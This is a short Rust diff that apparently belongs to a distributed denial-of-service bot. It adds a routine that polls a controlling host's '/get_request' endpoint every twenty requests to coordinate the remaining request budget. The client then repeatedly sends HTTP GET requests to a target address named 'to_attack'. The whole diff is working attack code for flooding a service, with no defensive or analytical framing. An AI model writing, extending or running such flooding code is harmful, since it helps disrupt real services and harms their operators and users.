@@ -17,13 +17,34 @@ impl Client {
         self.no_requests = value.parse().unwrap();
     }
 
+    fn check_requests(&mut self) -> bool {
+        if self.no_requests % 20 == 0 {
+            let url = format!("{}/get_request", self.host_address);
+            let value = reqwest::blocking::get(&url).unwrap().text().unwrap();
+            let remaining_requests: i32 = value.parse().unwrap();
+            if remaining_requests < 20 {
+                self.no_requests = remaining_requests;
+                return false;
+            }
+        }
+        true
+    }
+
     fn start_requesting(&mut self) {
-        let to_attack = self.address.as_str();
         while self.no_requests > 0 {
+            let can_continue = self.check_requests();
+            let to_attack = self.address.as_str();
+            if !can_continue {
+                break;
+            }
             let _ = reqwest::blocking::get(to_attack);
             self.no_requests -= 1;
         }
     }
+
+
+
+
     fn run(&mut self) {
         loop {
             match self.no_requests {
